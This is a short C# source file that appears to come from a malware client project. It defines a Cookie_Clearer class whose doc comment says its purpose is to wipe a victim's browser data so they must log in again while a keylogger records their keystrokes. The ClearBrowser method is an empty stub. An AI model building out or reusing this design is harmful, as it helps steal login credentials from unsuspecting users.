using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage.Cookies
{
    /// <summary>
    /// Clears browser cache, which then forces the unfortunate person to relogin, getting their keystrokes recorded.
    /// </summary>
    public class Cookie_Clearer
    {
        public enum Browser
        {
            Chrome, Edge, Firefox, Brave
        }

        public async static void ClearBrowser(Browser browser) {
            await Task.Run(() => { });
        }
    }
}
